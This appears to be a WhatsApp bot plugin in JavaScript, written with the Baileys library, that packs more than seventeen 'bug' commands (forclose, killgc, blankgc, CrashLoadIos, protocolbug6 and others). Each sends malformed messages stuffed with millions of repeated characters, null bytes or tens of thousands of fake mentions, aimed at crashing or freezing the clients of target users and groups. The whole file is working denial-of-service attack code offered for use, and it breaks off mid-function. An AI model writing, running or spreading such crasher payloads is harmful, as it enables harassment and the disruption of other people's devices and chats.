const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");

module.exports = {
    pattern: "bug",
    alias: ["buggc", "xgroup", "crashgc", "cyberkillgc", "blankgc", "forclose", "vampirebug", "ioscrash"],
    desc: "Complete bug functions pack",
    category: "owner",
    react: "💀",
    
    execute: async (conn, message, m, { from, reply, args, isCreator, isGroup }) => {
        if (!isCreator) return reply("🔒 Owner only");
        if (!isGroup) return reply("👥 Groups only");

        const action = args[0]?.toLowerCase() || "bug3";

        // ============ messageKontol ============
        const messageKontol = {
            key: {
                remoteJid: "5521992999999@s.whatsapp.net",
                fromMe: false,
                id: "CALL_MSG_" + Date.now(),
                participant: "5521992999999@s.whatsapp.net"
            },
            message: {
                callLogMessage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [{ jid: "5521992999999@s.whatsapp.net", callOutcome: "1" }]
                }
            }
        };

        // ============ 1. forclose ============
        async function forclose(target) {
            const msg = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        extendedTextMessage: {
                            text: "*𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓*",
                            contextInfo: {
                                mentionedJid: [target, "5521992999999@s.whatsapp.net"],
                                forwardingScore: 999,
                                isForwarded: false,
                                stanzaId: "FTG-EE62BD88F22C",
                                participant: "5521992999999@s.whatsapp.net",
                                remoteJid: target,
                                quotedMessage: {
                                    callLogMessage: {
                                        isVideo: false,
                                        callOutcome: "1",
                                        durationSecs: "0",
                                        callType: "REGULAR",
                                        participants: [{ jid: target, callOutcome: "1" }]
                                    }
                                }
                            }
                        }
                    }
                }
            }, { quoted: messageKontol });
            await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
        }

        // ============ 2. callinvisible ============
        async function callinvisible(target) {
            const msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: { text: "Danzz Bjir", format: "DEFAULT" },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1000000),
                                version: 3
                            }
                        },
                        contextInfo: {
                            participant: { jid: target },
                            mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)]
                        }
                    }
                }
            }, {});
            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
            });
        }

        // ============ 3. blank1 ============
        async function blank1(target) {
            const anta = 'ោ៝'.repeat(800000);
            const nyocot = 'ꦾ'.repeat(800000);
            const msg = { newsletterAdminInviteMessage: { newsletterJid: "1234567891234@newsletter", newsletterName: "sv Danzz ya bang" + anta + nyocot + "ោ៝".repeat(800000), caption: "Halo" + anta + nyocot + "ោ៝".repeat(800000), inviteExpiration: "90000", contextInfo: { participant: "0@s.whatsapp.net", remoteJid: "status@broadcast", mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"] } } };
            await conn.relayMessage(target, msg, { participant: { jid: target }, messageId: null });
        }

        // ============ 4. ForceXFrezee ============
        async function ForceXFrezee(target) {
            let crash = JSON.stringify({ action: "x", data: "x" });
            await conn.relayMessage(target, {
                stickerPackMessage: {
                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                    name: "CYBER Destroyed" + "ꦾ".repeat(7777777),
                    publisher: "𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓 💀",
                    stickers: [{ fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" }],
                    fileLength: "3662919",
                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
                    contextInfo: { remoteJid: "X", participant: "0@s.whatsapp.net", stanzaId: "1234567890ABCDEF", mentionedJid: ["6285215587498@s.whatsapp.net", ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)] },
                    mediaKeyTimestamp: "1747502082",
                    trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
                    thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
                    thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
                    thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
                    quotedMessage: { callLogMesssage: { isVideo: true, callOutcome: "REJECTED", durationSecs: "1", callType: "SCHEDULED_CALL", participants: [{ jid: target, callOutcome: "CONNECTED" }, { target: "0@s.whatsapp.net", callOutcome: "REJECTED" }] } }
                }
            }, {});
            const msg = generateWAMessageFromContent(target, {
                viewOnceMessageV2: {
                    message: {
                        listResponseMessage: {
                            title: "SILVER💦💦💦💦😖" + "ꦾꦾꦾꦾ",
                            listType: 4,
                            buttonText: { displayText: "🩸" },
                            sections: [],
                            singleSelectReply: { selectedRowId: "⌜⌟" },
                            contextInfo: {
                                mentionedJid: [target],
                                participant: "0@s.whatsapp.net",
                                remoteJid: "who know's Silver ?",
                                quotedMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: Math.floor(Date.now() / 1000) + 60 } },
                                externalAdReply: { title: "☀️", body: "🩸", mediaType: 1, renderLargerThumbnail: false, nativeFlowButtons: [{ name: "payment_info", buttonParamsJson: crash }, { name: "call_permission_request", buttonParamsJson: crash }] },
                                extendedTextMessage: { text: "ꦾ".repeat(800000) + "@1".repeat(20000), contextInfo: { stanzaId: target, participant: target, quotedMessage: { conversation: "💦💦💦💦😖" + "ꦾ࣯࣯".repeat(800000) + "@1".repeat(800000) }, disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" } }, inviteLinkGroupTypeV2: "DEFAULT" },
                                participant: target
                            }
                        }
                    }
                }
            }, {});
            await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
        }

        // ============ 5. killgc ============
        async function killgc(target) {
            let massage = [];
            for (let r = 0; r < 1000; r++) {
                massage.push({ fileName: "8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp", isAnimated: true, accessibilityLabel: "", isLottie: false, mimetype: "image/webp" });
            }
            const msg = {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                        nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "\0".repeat(1000000), version: 3 },
                        stickerPackMessage: {
                            stickerPackId: "76cd3656-3c76-4109-9b37-62c8a668329f",
                            name: "WOI GRUP KONTOL",
                            publisher: "",
                            stickers: massage,
                            fileLength: "999999999999999",
                            fileSha256: "NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=",
                            fileEncSha256: "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
                            mediaKey: "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
                            directPath: "/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc?ccb=11-4&oh=01_Q5Aa1QEZWzSJqGIwOUkeDSvpdnDSvVIvGUyVvW_uvgP5uTOePQ&oe=68403E51&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "99999999",
                            trayIconFileName: "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
                            thumbnailDirectPath: "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
                            thumbnailSha256: "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
                            thumbnailEncSha256: "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
                            contextInfo: {
                                mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                                isSampled: true,
                                participant: target,
                                remoteJid: target,
                                forwardingScore: 9741,
                                isForwarded: true,
                                businessMessageForwardInfo: { businessOwnerJid: target },
                                externalAdReply: { title: "*𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓*", body: "Grup Kontol" }
                            }
                        }
                    }
                }
            };
            await conn.relayMessage(target, msg, {});
        }

        // ============ 6. rusuhgc ============
        async function rusuhgc(target) {
            const msg = {
                botInvokeMessage: {
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: "33333333333333333@newsletter",
                            newsletterName: "𓆩 ＳＩＬＶＥＲ 𓆪" + "ꦾ".repeat(12000000),
                            jpegThumbnail: "",
                            caption: "ꦽ".repeat(12000000) + "@0".repeat(12000000),
                            inviteExpiration: Date.now() + 1814400000
                        }
                    }
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [{ name: "call_permission_request", buttonParamsJson: "{}" }, { name: "galaxy_message", paramsJson: { screen_2_OptIn_0: true, screen_2_OptIn_1: true, screen_1_Dropdown_0: "nullOnTop", screen_1_DatePicker_1: "1028995200000", screen_1_TextInput_2: "null@gmail.com", screen_1_TextInput_3: "94643116", screen_0_TextInput_0: "\0".repeat(50000000), screen_0_TextInput_1: "SecretDocu", screen_0_Dropdown_2: "#926-Xnull", screen_0_RadioButtonsGroup_3: "0_true", flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s." } }]
                },
                contextInfo: { mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"), groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Vampire" }] }
            };
            await conn.relayMessage(target, msg, { userJid: target });
        }

        // ============ 7. blankgc ============
        async function blankgc(target) {
            await conn.relayMessage(target, {
                newsletterAdminInviteMessage: {
                    newsletterJid: "120363425949353648@newsletter",
                    newsletterName: "\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51" + "ꦾꦾꦾ".repeat(90000000),
                    caption: "ؙ\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51\n" + "ꦾꦾꦾ".repeat(90000000),
                    inviteExpiration: "0"
                }
            }, { userJid: target });
        }

        // ============ 8. BugGb1 ============
        async function BugGb1(target) {
            const message = {
                botInvokeMessage: {
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: `33333333333333333@newsletter`,
                            newsletterName: "hokage" + "ꦾ".repeat(1200000),
                            jpegThumbnail: "https://files.catbox.moe/e17h49.jpg",
                            caption: "ꦽ".repeat(12000000) + "@0".repeat(12000000),
                            inviteExpiration: Date.now() + 1814400000
                        }
                    }
                },
                nativeFlowMessage: {
                    messageParamsJson: "𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓",
                    buttons: [{ name: "call_permission_request", buttonParamsJson: "{}" }, { name: "galaxy_message", paramsJson: { "screen_2_OptIn_0": true, "screen_2_OptIn_1": true, "screen_1_Dropdown_0": "nullOnTop", "screen_1_DatePicker_1": "1028995200000", "screen_1_TextInput_2": "null@gmail.com", "screen_1_TextInput_3": "94643116", "screen_0_TextInput_0": "\u0000".repeat(500000), "screen_0_TextInput_1": "SecretDocu", "screen_0_Dropdown_2": "#926-Xnull", "screen_0_RadioButtonsGroup_3": "0_true", "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s." } }]
                },
                contextInfo: { mentionedJid: Array.from({ length: 10 }, () => "0@s.whatsapp.net"), groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "XvoludUltra!" }] }
            };
            await conn.relayMessage(target, message, { userJid: target });
        }

        // ============ 9. BugGb12 ============
        async function BugGb12(target) {
            const message = {
                botInvokeMessage: {
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: `999999999999999999@newsletter`,
                            newsletterName: "𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓" + "ꦾ".repeat(120000),
                            jpegThumbnail: "https://files.catbox.moe/laws24.jpg",
                            caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                            inviteExpiration: Date.now() + 1814400000
                        }
                    }
                },
                nativeFlowMessage: {
                    messageParamsJson: "minato!",
                    buttons: [{ name: "call_permission_request", buttonParamsJson: "{}" }, { name: "galaxy_message", paramsJson: { "screen_2_OptIn_0": true, "screen_2_OptIn_1": true, "screen_1_Dropdown_0": "nullOnTop", "screen_1_DatePicker_1": "1028995200000", "screen_1_TextInput_2": "null@gmail.com", "screen_1_TextInput_3": "94643116", "screen_0_TextInput_0": "\u0018".repeat(500000), "screen_0_TextInput_1": "SecretDocu", "screen_0_Dropdown_2": "#926-Xnull", "screen_0_RadioButtonsGroup_3": "0_true", "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s." } }]
                },
                contextInfo: { mentionedJid: Array.from({ length: 10 }, () => "0@s.whatsapp.net"), groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "XvoludUltra" }] }
            };
            await conn.relayMessage(target, message, { userJid: target });
        }

        // ============ 10. VampireBugIns ============
        async function VampireBugIns(target) {
            const message = {
                botInvokeMessage: {
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: `33333333333333333@newsletter`,
                            newsletterName: "*𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓 CRASHER KILL GROUP*" + "ꦾ".repeat(120000000),
                            jpegThumbnail: "",
                            caption: "ꦽ".repeat(120000000) + "@0".repeat(120000000),
                            inviteExpiration: Date.now() + 1814400000
                        }
                    }
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [{ name: "call_permission_request", buttonParamsJson: "{}" }, { name: "galaxy_message", paramsJson: { "screen_2_OptIn_0": true, "screen_2_OptIn_1": true, "screen_1_Dropdown_0": "nullOnTop", "screen_1_DatePicker_1": "1028995200000", "screen_1_TextInput_2": "null@gmail.com", "screen_1_TextInput_3": "94643116", "screen_0_TextInput_0": "\u0000".repeat(500000), "screen_0_TextInput_1": "SecretDocu", "screen_0_Dropdown_2": "#926-Xnull", "screen_0_RadioButtonsGroup_3": "0_true", "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s." } }]
                },
                contextInfo: { mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"), groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Vampire" }] }
            };
            await conn.relayMessage(target, message, { userJid: target });
        }

        // ============ 11. VampireGroupInvis ============
        async function VampireGroupInvis(target) {
            const message = {
                botInvokeMessage: {
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: `33333333333333333@newsletter`,
                            newsletterName: "*𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓*" + "ꦾ".repeat(12000000),
                            jpegThumbnail: "",
                            caption: "ꦽ".repeat(12000000) + "@9".repeat(12000000),
                            inviteExpiration: Date.now() + 1814400000
                        }
                    }
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [{ name: "call_permission_request", buttonParamsJson: "{}" }, { name: "galaxy_message", paramsJson: { "screen_2_OptIn_0": true, "screen_2_OptIn_1": true, "screen_1_Dropdown_0": "nullOnTop", "screen_1_DatePicker_1": "1028995200000", "screen_1_TextInput_2": "null@gmail.com", "screen_1_TextInput_3": "94643116", "screen_0_TextInput_0": "\u0018".repeat(500000), "screen_0_TextInput_1": "SecretDocu", "screen_0_Dropdown_2": "#926-Xnull", "screen_0_RadioButtonsGroup_3": "0_true", "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s." } }]
                },
                contextInfo: { mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"), groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Vampire Official" }] }
            };
            await conn.relayMessage(target, message, { userJid: target });
        }

        // ============ 12. CrashLoadIos ============
        async function CrashLoadIos(target) {
            const LocationMessage = {
                locationMessage: {
                    degreesLatitude: 21.1266,
                    degreesLongitude: -11.8199,
                    name: " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n" + "\u0000".repeat(6000000) + "𑇂𑆵𑆴𑆿".repeat(600000),
                    url: "https://t.me/silverXtech",
                    contextInfo: {
                        externalAdReply: {
                            quotedAd: {
                                advertiserName: "𑇂𑆵𑆴𑆿".repeat(6000000),
                                mediaType: "IMAGE",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                caption: "@silv3rinfinity" + "𑇂𑆵𑆴𑆿".repeat(6000000)
                            },
                            placeholderKey: {
                                remoteJid: "0s.whatsapp.net",
                                fromMe: false,
                                id: "ABCDEF1234567890"
                            }
                        }
                    }
                }
            };
            await conn.relayMessage(target, LocationMessage, { participant: { jid: target } });
        }

        // ============ 13. protoXimg ============
        async function protoXimg(target, mention) {
            const msg = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m239/AQPhVUy-GB8j4eMwShipMnnTvurfJ-2lkIwl_Ya7rekL5bEjm0tAUbVWDFWIa70k7ppNkK_sKaiC25pIktUWgZrpPPd2gqBYZQfXkOY6Yw?ccb=9-4&oh=01_Q5Aa1QGHR_S8_fwvzLDqk9tWHgKIrZpbVKM_MgGLjZ6qa6m7mg&oe=6840325D&_nc_sid=e6ed6c&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "🧊 공격 KIM BAYU JIHON",
                            fileSha256: "aA1/vATnQcXlUBaQ1oAyXOC6I6ZRVDSuHaYDMpNcGbU=",
                            fileLength: "999999",
                            height: 999999,
                            width: 999999,
                            mediaKey: "b9k58Kc4h6DdwrOWefVdr/aLwHzoxxSWrFQ8Pk2uCXk=",
                            fileEncSha256: "odx9UpoytXfE7ze2CgIPrJa0K4cCEN/DxFfjt/wKimM=",
                            directPath: "/o1/v/t62.7118-24/f2/m239/AQPhVUy-GB8j4eMwShipMnnTvurfJ-2lkIwl_Ya7rekL5bEjm0tAUbVWDFWIa70k7ppNkK_sKaiC25pIktUWgZrpPPd2gqBYZQfXkOY6Yw?ccb=9-4&oh=01_Q5Aa1QGHR_S8_fwvzLDqk9tWHgKIrZpbVKM_MgGLjZ6qa6m7mg&oe=6840325D&_nc_sid=e6ed6c",
                            mediaKeyTimestamp: "1746342199",
                            contextInfo: {
                                isSampled: true,
                                mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)]
                            }
                        }
                    }
                }
            }, {});
            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
            });
            if (mention) {
                await conn.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }] });
            }
        }

        // ============ 14. protoXvid ============
        async function protoXvid(target, mention) {
            const videoMessage = {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
                fileLength: "999999",
                seconds: 999999,
                mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
                caption: "🧊 공격 *𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓*",
                height: 999999,
                width: 999999,
                fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
                directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1743848703",
                contextInfo: { isSampled: true, mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)] }
            };
            const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
            });
            if (mention) {
                await conn.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }] });
            }
        }

        // ============ 15. bulldozer ============
        async function bulldozer(target) {
            let message = {
                viewOnceMessage: {
                    message: {
                        stickerMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                            mimetype: "image/webp",
                            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                            fileLength: { low: 1, high: 0, unsigned: true },
                            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                            contextInfo: { mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")] }
                        }
                    }
                }
            };
            const msg = generateWAMessageFromContent(target, message, {});
            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
            });
        }

        // ============ 16. protocolbug3 ============
        async function protocolbug3(target, mention) {
            const msg = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        videoMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                            mimetype: "video/mp4",
                            fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                            fileLength: "999999",
                            seconds: 999999,
                            mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                            caption: "\u9999",
                            height: 999999,
                            width: 999999,
                            fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                            directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1743742853",
                            contextInfo: { isSampled: true, mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)] }
                        }
                    }
                }
            }, {});
            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
            });
            if (mention) {
                await conn.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }] });
            }
        }

        // ============ 17. protocolbug6 ============
        async function protocolbug6(target, mention) {
            const quotedMessage = {
                extendedTextMessage: {
                    text: "᭯".repeat(120000),
                    matchedText: "https://" + "ꦾ".repeat(5000) + ".com",
                    canonicalUrl: "https://" + "ꦾ".repeat(5000) + ".com",
                    description: "\u0000".repeat(5000),
                    title: "\u200D".repeat(10000),
                    previewType: "NONE",
                    jpegThumbnail: Buffer.alloc(10000),
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        externalAdReply: {
                            showAdAttribution: true,
                            title: "BoomXSuper",
                            body: "\u0000".repeat(100000),
                            thumbnailUrl: "https://" + "ꦾ".repeat(5000) + ".com",
                            mediaType: 1,
                            renderLargerThumbnail: true,
                            sourceUrl: "https://" + "𓂀".repeat(20000) + ".xyz"
                        },
                        mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
                    }
                }
            };
            const videoMessage = {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
                fileLength: "109951162777600",
                seconds: 999999,
                mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
                caption: "ꦾ".repeat(127777),
                height: 640,
                width: 640,
                fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
                directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1743848703",
                contextInfo: {
                    externalAdReply: { showAdAttribution: true, title: "𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓", body: `${"\u0000".repeat(91117)}`, mediaType: 1, renderLargerThumbnail: true, thumbnailUrl: null, sourceUrl: `https://${"ꦾ".repeat(10000)}.com/` },
                    businessMessageForwardInfo: { businessOwnerJid: target },
                    quotedMessage: quotedMessage,
                    isSampled: true,
                    mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)]
                }
            };
            const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
            });
            if (mention) {
                await conn.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }] });
            }
        }

        // ============ 18. delayMakerInvisible ============
        async function delayMakerInvisible(target) {
            let venomModsData = JSON.stringify({
                status: true,
                criador: "VenomMods",
                resultado: { type: "md", ws: { _events: { "CB:ib,,dirty": ["Array"] }, _eventsCount: 800000, _maxListeners: 0, url: "wss://web.whatsapp.com/ws/chat", config: { version: ["Array"], browser: ["Array"], waWebconnetUrl: "wss://web.whatsapp.com/ws/chat", connCectTimeoutMs: 20000, keepAliveIntervalMs: 30000, logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000, customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true, auth: { Object: "authData" }, markOnlineOnconnCect: true, syncFullHistory: true, linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: "transactionOptsData" }, generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: "appStateMacData" }, mobile: true } } }
            });
            let message = {
